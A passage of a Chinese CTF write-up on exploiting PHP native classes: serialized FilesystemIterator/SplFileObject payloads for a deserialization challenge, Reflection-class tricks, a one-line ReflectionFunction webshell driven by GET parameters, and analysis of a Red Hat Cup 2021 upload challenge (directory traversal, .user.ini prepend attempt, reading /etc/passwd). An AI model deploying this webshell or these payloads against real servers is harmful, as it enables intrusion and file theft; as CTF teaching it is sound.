    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = "<span class="hljs-title">B</span>";</span>
<span class="hljs-class">        $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span> = "<span class="hljs-title">ctfer</span>";</span>
<span class="hljs-class">        <span class="hljs-title">echo</span> <span class="hljs-title">new</span>  $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">    }</span>
<span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__wakeup</span>()    // 可以直接绕过<span class="hljs-title">__wakeup</span>()方法的执行</span>
<span class="hljs-class">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;para) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">        }</span>
<span class="hljs-class">        <span class="hljs-title">else</span></span>
<span class="hljs-class">            <span class="hljs-title">die</span>('<span class="hljs-title">bad</span> <span class="hljs-title">hacker</span>~');</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"> </span>
<span class="hljs-class">}</span>
<span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">B</span></span>{
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"hello "</span>.<span class="hljs-variable language_">$this</span>-&gt;a);
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{
 
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vaild</span>(<span class="hljs-params"><span class="hljs-variable">$code</span></span>)</span>{
        <span class="hljs-variable">$pattern</span> = <span class="hljs-string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$code</span>)){
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">else</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
 
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> A;
 
}</code></pre>
<p>这是一道PHP反序列化的题目，题目里面没有给出什么危险的函数调用，因此应该要想到是原生类的利用。留意这一段代码：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)    // 可以直接绕过<span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)方法的执行</span>
<span class="hljs-function">   </span>{
       <span class="hljs-variable language_">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;
       <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;para) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>)) {
           <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">       }</span>
<span class="hljs-class">       <span class="hljs-title">else</span></span>
<span class="hljs-class">           <span class="hljs-title">die</span>('<span class="hljs-title">bad</span> <span class="hljs-title">hacker</span>~');</span>
<span class="hljs-class">   }</span></code></pre>
<p>我们从反序列化的<code>__wakeup()</code>函数入手，看到新建了一个C的类对象，然后使用C类里面的<code>check()</code>方法对<code>$para</code>和<code>$class</code>这两个属性进行检查，看是否存在非法的字符，没有问题之后就使用<code>echo new $this-&gt;class ($this-&gt;para);</code>语句将新建类返回的内容输出。</p>
<p><strong>目录遍历类</strong></p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'FilesystemIterator'</span>;    
    <span class="hljs-comment">// FilesystemIterator("/var/www/html")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>得到payload：</p>
<pre><code class="hljs plaintext">O:1:"A":3:{s:5:"class";s:18:"FilesystemIterator";s:4:"para";s:14:"/var/www/html/";s:5:"check";N;}</code></pre>
<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE</p>
<p>继续往下找:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'FilesystemIterator'</span>;    
    <span class="hljs-comment">// FilesystemIterator("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>在这个文件夹下找到了<strong>flag.php</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625212501056.png" alt="image-20230625212501056"></p>
<p><strong>文件读取类</strong></p>
<p>然后我们使用 SplFileObject 类读取flag.php就行了：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'SplFileObject'</span>;    
    <span class="hljs-comment">// SplFileObject("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>得到payload：</p>
<pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">"A"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"class"</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">"SplFileObject"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"para"</span>;s:<span class="hljs-number">55</span>:<span class="hljs-string">"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;N;}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625212559026.png" alt="image-20230625212559026"></p>
<h3 id="108-反射类reflection">10.8 反射类Reflection</h3>
<p>它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。</p>
<h4 id="reflectionmethod-类获取类方法的相关信息">ReflectionMethod 类获取类方法的相关信息</h4>
<p>ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlagIsHere</span></span>
<span class="hljs-class"></span>{
  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 这是测试方法</span>
<span class="hljs-comment">   * flag{success}</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> int</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GiveMeFlag</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">  </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-number">9999</span>;
  }
}
 
<span class="hljs-variable">$ref</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionMethod</span>(<span class="hljs-string">'FlagIsHere'</span>,<span class="hljs-string">'GiveMeFlag'</span>);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ref</span>-&gt;<span class="hljs-title function_ invoke__">getDocComment</span>());</code></pre>
<p>输出：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625213132588.png" alt="image-20230625213132588"></p>
<h4 id="reflectionclass类读取类的属性和方法名">ReflectionClass类读取类的属性和方法名</h4>
<p>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ReflectionClass</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$argument</span>)</code></pre>
<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>用法如下</p>
<p>example：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625213302949.png" alt="image-20230625213302949"></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h4 id="reflectionfunction类写webshell">ReflectionFunction类写Webshell</h4>
<p><strong>ReflectionFunction</strong> 类报告了一个函数的有关信息。其中<code>invokeArgs()</code>方法能够用来写Webshell。</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ReflectionFunction</span>::<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span></code></pre>
<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像<code>call_user_func_array()</code>的工作方式。</li>
</ul>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">title</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$name</span></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">"%s. %s\r\n"</span>, <span class="hljs-variable">$title</span>, <span class="hljs-variable">$name</span>);
}
 
<span class="hljs-variable">$function</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-string">'title'</span>);
 
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$function</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'Dr'</span>, <span class="hljs-string">'Phil'</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625213625905.png" alt="image-20230625213625905"></p>
<p>我们可以使用这个方法来写Webshell：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-variable">$func</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$_GET</span>[m]);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[c]));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625213847803.png" alt="image-20230625213847803"></p>
<p><strong>[红帽杯 2021 final]upload</strong></p>
<p>由于线下是AWDplus的模式，需要挖洞并且修洞，直接给出了源码，有3个文件。</p>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">red</span>(<span class="hljs-params"><span class="hljs-variable">$fileinfo</span></span>)</span>{
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$fileinfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>){
        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$value</span>;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$key</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a style='color:#ff6347' href='<span class="hljs-subst">$path</span>'&gt;<span class="hljs-subst">$name</span>&lt;/a&gt;\n"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
}
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">green</span>(<span class="hljs-params"><span class="hljs-variable">$fileinfo</span></span>)</span>{
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$fileinfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>){
        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$value</span>;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$key</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a style='color:#32cd32' href='<span class="hljs-subst">$path</span>'&gt;<span class="hljs-subst">$name</span>&lt;/a&gt;\n"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">file</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;path = <span class="hljs-variable">$path</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;path);
    }
}</code></pre>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
<span class="hljs-keyword">include</span>(<span class="hljs-string">'class.php'</span>);
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>] = <span class="hljs-string">'showfile'</span>;
}
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>] = <span class="hljs-keyword">array</span>();
}
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] = <span class="hljs-keyword">array</span>();
}
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];          
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);           
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$filename</span>] = <span class="hljs-variable">$filepath</span>;    
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>][<span class="hljs-variable">$filepath</span>] = <span class="hljs-string">'file'</span>;        
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/?file='</span>.<span class="hljs-variable">$filename</span>);
 
}
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
    &lt;h3&gt;upload your file below&lt;/h3&gt;
    &lt;form action=<span class="hljs-string">"index.php"</span> method=<span class="hljs-string">"post"</span>&gt;
        &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"filename"</span> value=<span class="hljs-string">"filename"</span> style=<span class="hljs-string">"width: 600px;"</span>&gt;
        &lt;/br&gt;
        &lt;/br&gt;
        &lt;textarea type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"content"</span> style=<span class="hljs-string">"width: 600px;height: 300px;"</span> &gt;&lt;/textarea&gt;
        &lt;/br&gt;
 
        &lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"submit"</span>&gt;
    &lt;/form&gt;
    &lt;h4&gt;beatiful front&lt;/h4&gt;
&lt;/div&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)&gt;<span class="hljs-number">1</span>){
    <span class="hljs-variable">$showfile</span> = <span class="hljs-string">'red'</span>;
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$showfile</span> =<span class="hljs-string">'green'</span>;
}
<span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){            
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}
<span class="hljs-variable">$out</span> = <span class="hljs-string">'&lt;p&gt;your file:'</span>;
 
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filelist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>){
    <span class="hljs-variable">$out</span> .= <span class="hljs-variable">$value</span>.<span class="hljs-string">' '</span>;         
}
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>.<span class="hljs-string">'&lt;/p&gt;'</span>;
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]])) {      <span class="hljs-comment">//GET方法读取文件名，从session的文件名字里面寻找</span>
 
        <span class="hljs-variable">$pathinfo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]=&gt;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]]);
        ${<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]}(<span class="hljs-variable">$pathinfo</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no such file!'</span>;
    }
}
<span class="hljs-meta">?&gt;</span>
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>info.php</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">phpinfo</span>();</code></pre>
<p><strong>分析题目</strong></p>
<p>首先是index页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625220645325.png" alt="image-20230625220645325"></p>
<p>这里能够让用户填写文件的文件名和内容，然后提交，提交的文件正常情况下会保存在<code>./files</code>目录下，看一下后台是怎么对文件进行操作的：</p>
<pre><code class="hljs PHP"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){            <span class="hljs-comment">// 对文件名有h字符的进行过滤</span>
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];      <span class="hljs-comment">// 这里可以目录穿越</span>
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);       <span class="hljs-comment">// basename()函数获取文件名字</span>
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);</code></pre>
<p>通过分析可以发现我们上传的文件存在目录穿越的问题，我们能通过<code>filename=../xxxx</code>这种方式将文件保存的路径穿越到服务器的任意路径下，但是由于存在对文件名h字符的过滤，因此无法直接传一个php文件到网站根目录下执行，得另寻僻径。</p>
<p><strong>.user.ini（无果）</strong></p>
<p>既然过滤掉了h字符，意味着<code>.htaccess</code>这样的修改配置文件意味着行不通，但是我想起了另外一个修改配置的文件<code>.user.ini</code>。<code>.user.ini</code>和<code>.htaccess</code>一样是对当前目录的所以<code>php</code>文件的配置设置，即写了<code>.user.ini</code>和它同目录的文件会优先使用<code>.user.ini</code>中设置的配置属性。</p>
<p>但是不是<code>php.ini</code>中的每个变量都能通过<code>ini_set()</code>或者<code>.user.ini</code>和<code>.htaccess</code>来设置，简单的来说每个变量有它所属于的模式，下面官方手册的四个模式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625220942835.png" alt="image-20230625220942835"></p>
<p>通过上表，看到<code>PHP_INI_USER</code>模式中提到，可以在<code>.user.ini</code>中设定。<strong>但实际上，只要不是<code>PHP_INI_SYSTEM</code>模式下的属性，均可以在<code>.user.ini</code>中设置。</strong></p>
<p>那配置文件应该怎么写呢，这里有官方的配置选项列表：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">php.ini 配置选项列表</a></p>
<p>在文件上传的题目中，我们只需记住这两个选项即可：</p>
<pre><code class="hljs php">auto_prepend_file = xxx        <span class="hljs-comment">// 在每个文件头添加上指定文件的内容，相当于include(xxx)</span>
user_ini.cache_ttl = xx        <span class="hljs-comment">// 设置配置的生效时间，默认300秒</span></code></pre>
<p>于是我们就想是否能够通过上传一个一句话木马文件，然后再目录穿越将<code>.user.ini</code>上传到网站根目录下，内容是让其他文件都包含这个一句话木马，从而实现getshell，但是尝试了很多次都无果，由此猜测运行的模式是<code>PHP_INI_SYSTEM</code>导致了<code>.user.ini</code>无法生效。</p>
<p><strong>SplFileObject类读文件</strong></p>
<p>比赛的时候做到这里其实已经没思路了（还是题目刷得少啊），赛后看有通过<strong>SplFileObject 类</strong>来读文件得思路，那先得了解一下<strong>SplFileObject 类</strong>是个什么玩意。</p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;        <span class="hljs-comment">// 输出 root:x:0:0:root:/root:/bin/bash</span></code></pre>
<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);
}</code></pre>
<p><strong>session反序列化</strong></p>
